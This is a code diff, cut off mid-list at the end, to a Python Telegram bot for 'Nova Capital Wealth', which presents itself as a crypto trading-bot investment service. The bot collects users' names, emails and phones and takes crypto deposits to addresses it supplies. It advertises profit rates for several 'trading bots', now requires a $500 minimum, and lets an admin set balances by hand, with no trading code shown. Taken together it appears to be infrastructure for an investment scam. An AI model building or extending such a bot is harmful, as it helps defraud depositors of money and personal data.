@@ -1,5 +1,7 @@
 import os
 import logging
+from threading import Thread
+from flask import Flask
 from typing import Dict, Any
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -7,7 +9,6 @@ from telegram.ext import (
     filters, ContextTypes, ConversationHandler
 )
 from telegram.error import TelegramError
-from storage import user_data, crypto_addresses
 
 # Enable logging
 logging.basicConfig(
@@ -18,8 +19,7 @@ logger = logging.getLogger(__name__)
 
 # States for conversation handler
 (WAITING_NAME, WAITING_EMAIL, WAITING_PHONE, MAIN_MENU,
- DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_CRYPTO_ADDRESS,
- WITHDRAW_BANK_NAME, WITHDRAW_ACCOUNT, WITHDRAW_ROUTING) = range(11)
+ DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_CRYPTO_ADDRESS) = range(8)
 
 # Bot configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
@@ -41,17 +41,54 @@ def get_admin_id() -> int:
 
 # Trading bots configuration
 trading_bots = {
-    'NCW Trading Bot': {'description': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.', 'profit_rate': 1010},
-    'TrendSeeker': {'description': 'Conservative strategy focusing on steady market trends.', 'profit_rate': 850},
-    'GrowthMaster': {'description': 'Balanced approach for moderate risk and consistent growth.', 'profit_rate': 900},
-    'ProfitPulse': {'description': 'Aggressive strategy targeting high returns in volatile markets.', 'profit_rate': 950},
-    'StableCore': {'description': 'Diversified portfolio for long-term stability and growth.', 'profit_rate': 800}
+    'NCW Trading Bot': {'description': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.', 'profit_rate': f'20%-35'},
+    'TrendSeeker': {'description': 'Conservative strategy focusing on steady market trends.', 'profit_rate': f'15%-25'},
+    'GrowthMaster': {'description': 'Balanced approach for moderate risk and consistent growth.', 'profit_rate': f'17%-21'},
+    'ProfitPulse': {'description': 'Aggressive strategy targeting high returns in volatile markets.', 'profit_rate': f'12%-16'},
+    'StableCore': {'description': 'Diversified portfolio for long-term stability and growth.', 'profit_rate': f'19%-23%'}
+}
+
+# Keep-alive web server
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "I am alive"
+
+def run_http():
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
+
+def keep_alive():
+    t = Thread(target=run_http)
+    t.start()
+
+# Crypto default chain mapping for display in withdraw flows
+CRYPTO_CHAINS = {
+    'BTC': 'Bitcoin Mainnet',
+    'ETH': 'Ethereum (ERC-20)',
+    'USDT': 'Tether (ERC-20)',
+    'USDC': 'USD Coin (ERC-20)',
+    'BNB': 'Binance Smart Chain (BEP-20)',
+    'SOL': 'Solana',
+    'ADA': 'Cardano',
+    'XRP': 'XRP Ledger',
+    'DOGE': 'Dogecoin',
+    'DOT': 'Polkadot',
+    'TRX': 'Tron (TRC-20)',
+    'LTC': 'Litecoin',
+    'BCH': 'Bitcoin Cash',
+    'LINK': 'Chainlink (ERC-20)',
+    'MATIC': 'Polygon (ERC-20)'
 }
 
 def get_user_data(user_id: int) -> Dict[str, Any]:
     """Get user data with default values"""
-    if user_id not in user_data:
-        user_data[user_id] = {
+    from database import db
+    
+    user_info = db.get_user(user_id)
+    
+    if not user_info:
+        user_info = {
             'name': '',
             'email': '',
             'phone': '',
@@ -59,12 +96,14 @@ def get_user_data(user_id: int) -> Dict[str, Any]:
             'deposit': 0.0,
             'profit': 0.0,
             'withdrawal': 0.0,
-            'approved': True,
+            'approved': False,
             'active_bot': None,
             'pending_deposit': 0.0,
             'pending_withdrawal': 0.0
         }
-    return user_data[user_id]
+        db.save_user(user_id, user_info)
+    
+    return user_info
 
 def create_cancel_keyboard():
     """Create a keyboard with cancel button"""
@@ -83,7 +122,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     # Check if user is already registered
     user_info = get_user_data(user_id)
     if user_info['name'] and user_info['email'] and user_info['phone']:
-        return await show_main_menu(update, context)
+        # Check if approved
+        if user_info.get('approved', False):
+            return await show_main_menu(update, context)
+        else:
+            await update.message.reply_text(
+                "⏳ Your account is awaiting admin approval. You'll be notified once your account is activated."
+            )
+            return ConversationHandler.END
         
     keyboard = [
         [InlineKeyboardButton("🚀 START NOW", callback_data='start_registration')],
@@ -97,7 +143,7 @@ Your trusted trading bot in achieving consistent and secure trading success. Des
 
 With a focus on safety, transparency, and efficiency, our bot operates within a secure trading environment, ensuring that your investments are well-protected while maximizing opportunities in the market.
 
-Nova Capital Wealth Trading Bot offers you the perfect balance of high performance and peace of mind. Ready to unlock your financial potential? Click “START NOW” to begin!"""
+Nova Capital Wealth Trading Bot offers you the perfect balance of high performance and peace of mind. Ready to unlock your financial potential? Click "START NOW" to begin!"""
     
     await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
     return WAITING_NAME
@@ -136,6 +182,9 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_info = get_user_data(user_id)
     user_info['name'] = update.message.text.strip()
     
+    from database import db
+    db.save_user(user_id, user_info)
+    
     await update.message.reply_text(
         "Please enter your email address:",
         reply_markup=create_cancel_keyboard()
@@ -154,6 +203,9 @@ async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_info = get_user_data(user_id)
     user_info['email'] = update.message.text.strip()
     
+    from database import db
+    db.save_user(user_id, user_info)
+    
     await update.message.reply_text(
         "Please enter your phone number:",
         reply_markup=create_cancel_keyboard()
@@ -171,20 +223,32 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         
     user_info = get_user_data(user_id)
     user_info['phone'] = update.message.text.strip()
-    user_info['approved'] = True
+    user_info['approved'] = False  # Requires admin approval
+    
+    # Save to database
+    from database import db
+    db.save_user(user_id, user_info)
     
     # Notify admin of new user registration
-    admin_message = f"""👤 **New User Registered**
+    admin_message = f"""👤 **New User Registration**
 
 🆔 **User ID:** {user_id}
 👤 **Name:** {user_info['name']}
 📧 **Email:** {user_info['email']}
-📱 **Phone:** {user_info['phone']}"""
+📱 **Phone:** {user_info['phone']}
+
+Click 'Approve' to activate this user's account."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_new_user_{user_id}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
         await context.bot.send_message(
             chat_id=admin_id,
             text=admin_message,
+            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
         logger.info(f"Sent registration notification for user {user_id} to admin {admin_id}")
@@ -192,12 +256,91 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         logger.error(f"Failed to notify admin of new user {user_id}: {e}")
     
     await update.message.reply_text(
-        f"Welcome, {user_info['name']}! Your account is ready. Access the main menu to start trading.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved."
     )
-    logger.info(f"User {user_id} completed registration")
+    logger.info(f"User {user_id} completed registration, awaiting approval")
     
-    return MAIN_MENU
+    return ConversationHandler.END
+
+async def approve_new_user_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle admin approval of new user registration"""
+    query = update.callback_query
+    await query.answer()
+    
+    admin_id = get_admin_id()
+    if update.effective_user.id != admin_id:
+        await query.edit_message_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        user_id = int(query.data.split('_')[-1])
+        
+        user_info = get_user_data(user_id)
+        if not user_info or not user_info.get('name'):
+            await query.edit_message_text("❌ User not found.")
+            return
+        
+        # CHECK: Prevent double approval
+        if user_info.get('approved', False):
+            await query.edit_message_text(
+                f"{query.message.text}\n\n⚠️ **Already Approved** - This user has already been approved."
+            )
+            logger.warning(f"Attempted double approval for user {user_id}")
+            return
+        
+        # Approve user
+        user_info['approved'] = True
+        from database import db
+        db.save_user(user_id, user_info)
+        
+        # Update admin message
+        await query.edit_message_text(
+            f"{query.message.text}\n\n✅ **User Approved** - Access granted",
+            parse_mode='Markdown'
+        )
+        
+        # Send main menu directly to user
+        menu_text = f"""🎉 **Great news, {user_info['name']}!** 🎉
+
+Your account has been approved. Welcome to Nova Capital Wealth Trading Bot!
+
+💰 **Available Balance:** ${user_info.get('balance', 0):.2f}
+📈 **Deposit:** ${user_info.get('deposit', 0):.2f}
+📊 **Profit:** ${user_info.get('profit', 0):.2f}
+📉 **Withdrawal:** ${user_info.get('withdrawal', 0):.2f}"""
+        
+        keyboard = [
+            [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
+             InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
+            [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
+             InlineKeyboardButton("🎯 Stake", callback_data='stake')],
+            [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
+             InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
+             [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
+             [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=menu_text,
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+            # Mark the user's conversation state so they can interact immediately
+            user_data_store = context.application.dispatcher.user_data
+            user_store = user_data_store.setdefault(user_id, {})
+            user_store['conversation_state'] = 'MAIN_MENU'
+            user_store['_in_conversation'] = True
+            logger.info(f"Sent approval notification and main menu to user {user_id}")
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id} of approval: {e}")
+        
+    except (ValueError, IndexError) as e:
+        logger.error(f"Error approving user: {e}")
+        await query.edit_message_text("❌ Invalid format.")
+
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Display the main menu"""
@@ -217,6 +360,14 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         
     user_info = get_user_data(user_id)
     
+    # Check if user is approved
+    if not user_info.get('approved', False):
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="⏳ Your account is awaiting admin approval. You'll be notified once your account is activated."
+        )
+        return ConversationHandler.END
+    
     menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
 
 💰 **Available Balance:** ${user_info['balance']:.2f}
@@ -231,6 +382,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
          InlineKeyboardButton("🎯 Stake", callback_data='stake')],
         [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
          InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
+        [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -315,6 +467,9 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
     query = update.callback_query
     await query.answer()
     
+    from database import db
+    crypto_addresses = db.get_all_crypto_addresses()
+    
     keyboard = []
     for crypto in crypto_addresses.keys():
         keyboard.append([InlineKeyboardButton(f"{crypto}", callback_data=f'crypto_select_{crypto}')])
@@ -346,6 +501,8 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
     
     crypto_name = query.data.split('_')[-1]
     context.user_data['selected_crypto'] = crypto_name
+    # If user is not in a ConversationHandler instance, mark that we are expecting a deposit amount
+    context.user_data['awaiting_deposit_amount'] = True
     
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
@@ -363,14 +520,21 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
         
+    # Clear awaiting flag if present; if we are here due to a top-level message handler, it should be cleared
+    if context.user_data.pop('awaiting_deposit_amount', None):
+        pass
     try:
         amount = float(update.message.text)
         if amount <= 0:
             raise ValueError("Amount must be positive")
             
         context.user_data['deposit_amount'] = amount
+        # Mark that we are expecting proof (photo) for top-level handler fallback
+        context.user_data['awaiting_deposit_proof'] = True
         crypto_name = context.user_data['selected_crypto']
-        address = crypto_addresses[crypto_name]
+        
+        from database import db
+        address = db.get_crypto_address(crypto_name)
         
         keyboard = [
             [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_address_{crypto_name}')],
@@ -414,7 +578,9 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     await query.answer()
     
     crypto_name = query.data.split('_')[-1]
-    address = crypto_addresses[crypto_name]
+    
+    from database import db
+    address = db.get_crypto_address(crypto_name)
     
     # Send the address as plain text for manual copying
     await context.bot.send_message(
@@ -492,6 +658,8 @@ async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     query = update.callback_query
     await query.answer()
     
+    # Mark expecting deposit proof for non-conversation flows
+    context.user_data['awaiting_deposit_proof'] = True
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
         text="Please send a screenshot of your payment as proof:",
@@ -512,6 +680,8 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     amount = context.user_data.get('deposit_amount', 0.0)
     crypto_name = context.user_data.get('selected_crypto', 'Unknown')
     
+    # Clear awaiting flag as proof has been received
+    context.user_data.pop('awaiting_deposit_proof', None)
     context.user_data['deposit_message_id'] = update.message.message_id if update.message else None
     
     admin_message = f"""💳 **New Deposit Request**
@@ -556,6 +726,9 @@ Click 'Approve' to confirm this deposit."""
         return MAIN_MENU
         
     user_info['pending_deposit'] = amount
+    from database import db
+    db.save_user(user_id, user_info)
+    
     await update.message.reply_text(
         "Your deposit is pending admin confirmation. You'll be notified once it's processed.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
@@ -586,18 +759,29 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
         target_user_id = int(parts[-2])
         amount = float(parts[-1])
         
-        if target_user_id not in user_data:
+        user_info = get_user_data(target_user_id)
+        if not user_info or not user_info.get('name'):
             logger.error(f"User {target_user_id} not found for deposit confirmation")
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text="❌ User not found."
             )
             return MAIN_MENU
+        
+        # CHECK: Prevent double approval
+        if user_info.get('pending_deposit', 0) == 0:
+            await query.edit_message_text(
+                f"{query.message.text}\n\n⚠️ **Already Processed** - This deposit has already been approved."
+            )
+            logger.warning(f"Attempted double approval of deposit for user {target_user_id}")
+            return MAIN_MENU
             
-        user_info = get_user_data(target_user_id)
         user_info['balance'] += amount
         user_info['deposit'] += amount
         user_info['pending_deposit'] = 0
+        
+        from database import db
+        db.save_user(target_user_id, user_info)
         
         logger.info(f"Approved deposit of ${amount:.2f} for user {target_user_id}. New balance: ${user_info['balance']:.2f}")
         
@@ -612,7 +796,7 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
             logger.error(f"Failed to notify user {target_user_id} of deposit confirmation: {e}")
             
         await query.edit_message_text(
-            f"{query.message.text}\n\n✅ **Deposit Approved** for user {target_user_id}."
+            f"{query.message.text}\n\n✅ **Deposit Approved** - ${amount:.2f} added to user {target_user_id}'s balance."
         )
         logger.info(f"Updated admin message for deposit confirmation for user {target_user_id}")
         
@@ -641,19 +825,72 @@ async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     query = update.callback_query
     await query.answer()
     
+    # Only crypto withdrawals supported; present a list of cryptos for selection
     keyboard = [
-        [InlineKeyboardButton("₿ Crypto", callback_data='withdraw_crypto')],
-        [InlineKeyboardButton("🏦 Bank Transfer", callback_data='withdraw_bank')],
+        [InlineKeyboardButton("Select Crypto for Withdrawal", callback_data='withdraw_crypto')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text="How would you like to withdraw?",
+        text="Please select the cryptocurrency you want to withdraw:",
         reply_markup=reply_markup
     )
     return MAIN_MENU
+
+
+async def show_withdraw_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Show a short list of popular cryptocurrencies to choose from when withdrawing."""
+    query = update.callback_query
+    await query.answer()
+
+    # A short list of popular crypto (15 items) with default chains
+    cryptos = [
+        ('BTC', 'Bitcoin (BTC)'), ('ETH', 'Ethereum (ERC-20)'), ('USDT', 'Tether (ERC-20)'),
+        ('USDC', 'USD Coin (ERC-20)'), ('BNB', 'Binance Chain (BEP-20)'), ('SOL', 'Solana (SOL)'),
+        ('ADA', 'Cardano (ADA)'), ('XRP', 'Ripple (XRP)'), ('DOGE', 'Dogecoin (DOGE)'),
+        ('DOT', 'Polkadot (DOT)'), ('TRX', 'TRON (TRC-20)'), ('LTC', 'Litecoin (LTC)'),
+        ('BCH', 'Bitcoin Cash (BCH)'), ('LINK', 'Chainlink (LINK)'), ('MATIC', 'Polygon (MATIC)')
+    ]
+
+    keyboard = []
+    # Keep list short: two columns
+    for symbol, display in cryptos:
+        keyboard.append([InlineKeyboardButton(f"{display}", callback_data=f'withdraw_select_{symbol}')])
+    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Please select the cryptocurrency you wish to withdraw:",
+        reply_markup=reply_markup
+    )
+    return MAIN_MENU
+
+
+async def handle_withdraw_crypto_select(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """User picked a crypto to withdraw — store selection and ask for amount.
+    Also show the default chain for the selected crypto.
+    """
+    query = update.callback_query
+    await query.answer()
+
+    crypto = query.data.replace('withdraw_select_', '')
+    chain_info = CRYPTO_CHAINS.get(crypto, 'Unknown chain')
+
+    context.user_data['withdrawal_method'] = 'crypto'
+    context.user_data['selected_withdraw_crypto'] = crypto
+    # mark awaiting withdraw amount for fallback
+    context.user_data['awaiting_withdraw_amount'] = True
+
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"You selected **{crypto}**. Network: {chain_info}.\nEnter the amount you want to withdraw in USD:",
+        parse_mode='Markdown',
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_AMOUNT
 
 async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get withdrawal amount for crypto"""
@@ -671,6 +908,8 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
     await query.answer()
     
     context.user_data['withdrawal_method'] = 'crypto'
+    # If not in a conversation, mark that we're expecting the withdraw amount next (top-level fallback)
+    context.user_data['awaiting_withdraw_amount'] = True
     
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
@@ -679,29 +918,7 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
     )
     return WITHDRAW_AMOUNT
 
-async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get withdrawal amount for bank transfer"""
-    user_id = update.effective_user.id
-    admin_id = get_admin_id()
-    
-    if user_id == admin_id:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Admins cannot access user features."
-        )
-        return ConversationHandler.END
-        
-    query = update.callback_query
-    await query.answer()
-    
-    context.user_data['withdrawal_method'] = 'bank'
-    
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text="Enter the amount you want to withdraw in USD:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_AMOUNT
+## Bank withdrawal flow removed (deprecated)
 
 async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Process withdrawal amount"""
@@ -712,6 +929,9 @@ async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
         
+    # Clear awaiting flag if present
+    if context.user_data.pop('awaiting_withdraw_amount', None):
+        pass
     try:
         amount = float(update.message.text)
         user_info = get_user_data(user_id)
@@ -729,17 +949,21 @@ async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE
         context.user_data['withdraw_amount'] = amount
         
         if context.user_data['withdrawal_method'] == 'crypto':
+            selected = context.user_data.get('selected_withdraw_crypto')
+            chain_info = CRYPTO_CHAINS.get(selected, 'Unknown chain')
             await update.message.reply_text(
-                "Please enter your cryptocurrency wallet address:",
+                f"Please enter your {selected} wallet address (Network: {chain_info}):",
                 reply_markup=create_cancel_keyboard()
             )
+            # mark we're awaiting crypto address for fallback path
+            context.user_data['awaiting_withdraw_crypto_address'] = True
             return WITHDRAW_CRYPTO_ADDRESS
         else:
             await update.message.reply_text(
                 "Please enter your bank name:",
                 reply_markup=create_cancel_keyboard()
             )
-            return WITHDRAW_BANK_NAME
+            # bank flow removed
             
     except ValueError:
         await update.message.reply_text(
@@ -757,15 +981,20 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
         
+    # Clear awaiting flag if present
+    context.user_data.pop('awaiting_withdraw_crypto_address', None)
     context.user_data['crypto_address'] = update.message.text.strip()
     user_info = get_user_data(user_id)
     amount = context.user_data['withdraw_amount']
     address = context.user_data['crypto_address']
+    selected_crypto = context.user_data.get('selected_withdraw_crypto', 'Unknown')
+    chain_info = CRYPTO_CHAINS.get(selected_crypto, 'Unknown chain')
     
     admin_message = f"""💸 **Crypto Withdrawal Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
 💰 **Amount:** ${amount:.2f}
+🪙 **Crypto:** {selected_crypto} ({chain_info})
 🏦 **Crypto Address:** {address}
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
@@ -793,100 +1022,20 @@ Click 'Approve' to confirm this withdrawal."""
         return MAIN_MENU
         
     user_info['pending_withdrawal'] = amount
+    from database import db
+    db.save_user(user_id, user_info)
+    
     await update.message.reply_text(
         "Your withdrawal request is pending admin confirmation.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
     return MAIN_MENU
 
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    admin_id = get_admin_id()
-    
-    if user_id == admin_id:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-        
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
+# Bank flow functions removed: get_bank_name
 
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    admin_id = get_admin_id()
-    
-    if user_id == admin_id:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-        
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
+# Bank flow functions removed: get_account_number
 
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    admin_id = get_admin_id()
-    
-    if user_id == admin_id:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-        
-    context.user_data['routing_number'] = update.message.text.strip()
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click 'Approve' to confirm this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    try:
-        await context.bot.send_message(
-            chat_id=admin_id,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-        
-    user_info['pending_withdrawal'] = amount
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
+# Bank flow functions removed: get_routing_number
 
 async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle admin's withdrawal approval via button"""
@@ -906,15 +1055,22 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
         user_id = int(user_id_str)
         amount = float(amount_str)
         
-        if user_id not in user_data:
+        user_info = get_user_data(user_id)
+        if not user_info or not user_info.get('name'):
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text="❌ User not found."
             )
             return MAIN_MENU
-            
-        user_info = get_user_data(user_id)
         
+        # CHECK: Prevent double approval
+        if user_info.get('pending_withdrawal', 0) == 0:
+            await query.edit_message_text(
+                f"{query.message.text}\n\n⚠️ **Already Processed** - This withdrawal has already been approved."
+            )
+            logger.warning(f"Attempted double approval of withdrawal for user {user_id}")
+            return MAIN_MENU
+            
         if amount > user_info['balance']:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
@@ -926,6 +1082,9 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
         user_info['withdrawal'] += amount
         user_info['pending_withdrawal'] = 0
         
+        from database import db
+        db.save_user(user_id, user_info)
+        
         try:
             await context.bot.send_message(
                 chat_id=user_id,
@@ -936,7 +1095,7 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
             logger.error(f"Failed to notify user {user_id}: {e}")
             
         await query.edit_message_text(
-            f"{query.message.text}\n\n✅ **Withdrawal Approved** for user {user_id}."
+            f"{query.message.text}\n\n✅ **Withdrawal Approved** - ${amount:.2f} deducted from user {user_id}'s balance."
         )
         return MAIN_MENU
         
@@ -983,7 +1142,7 @@ async def show_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to activate its strategy:",
+        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to activate its strategy:\n\n⚠️ **Minimum Deposit Required:** $500.00",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -1007,14 +1166,18 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
     bot_name = query.data.replace('select_bot_', '')
     user_info = get_user_data(user_id)
     
-    if user_info['balance'] <= 0:
+    # Check minimum deposit requirement of $500
+    MINIMUM_DEPOSIT = 500.00
+    
+    if user_info['balance'] < MINIMUM_DEPOSIT:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="⚠️ You need a positive balance to activate a trading bot. Please make a deposit first.",
+            text=f"⚠️ **Insufficient Balance**\n\nYou need at least **${MINIMUM_DEPOSIT:.2f}** to activate a trading bot.\n\n💰 **Your Balance:** ${user_info['balance']:.2f}\n💳 **Required:** ${MINIMUM_DEPOSIT:.2f}\n\nPlease make a deposit to continue.",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💳 Deposit", callback_data='deposit')],
-                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
-            ])
+                [InlineKeyboardButton("💳 Deposit Now", callback_data='deposit')],
+                [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
+            ]),
+            parse_mode='Markdown'
         )
         return MAIN_MENU
     
@@ -1026,6 +1189,9 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
     else:
         user_info['active_bot'] = bot_name
+        from database import db
+        db.save_user(user_id, user_info)
+        
         profit_rate = trading_bots[bot_name]['profit_rate']
         description = trading_bots[bot_name]['description']
         message = f"""✅ **{bot_name} Activated!**
@@ -1139,6 +1305,7 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
          InlineKeyboardButton("🎯 Stake", callback_data='stake')],
         [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
          InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
+        [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1167,6 +1334,22 @@ async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     
     user_id = update.effective_user.id
     user_info = get_user_data(user_id)
+    # Clear any awaiting action flags to avoid being stuck
+    for key in [
+        'awaiting_deposit_amount', 'awaiting_deposit_proof', 'awaiting_withdraw_amount',
+        'awaiting_withdraw_crypto_address',
